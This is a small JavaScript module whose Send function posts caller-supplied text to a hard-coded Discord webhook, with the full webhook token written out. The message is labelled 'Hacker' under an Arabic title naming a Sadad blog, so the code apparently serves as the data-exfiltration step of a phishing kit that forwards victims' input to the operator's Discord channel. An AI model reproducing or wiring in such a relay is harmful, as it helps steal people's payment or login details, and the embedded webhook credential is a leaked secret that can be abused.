import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1330250201453297736/-2mu4hLpurKcBcGZHGgoakx2iwPhpC9_bMNZxT_PhcYQfLKx141MAsCI1KRkd13zgBXU",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
